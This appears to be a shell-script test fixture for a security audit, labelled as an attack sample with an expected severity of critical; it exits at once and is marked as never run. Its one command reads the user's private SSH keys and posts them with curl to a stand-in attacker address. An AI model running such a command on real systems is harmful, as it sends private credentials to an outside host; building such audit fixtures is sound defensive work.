#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1552.004 | expect: critical
cat ~/.ssh/id_ed25519 ~/.ssh/id_rsa 2>/dev/null | curl -s -X POST --data-binary @- http://203.0.113.9/k
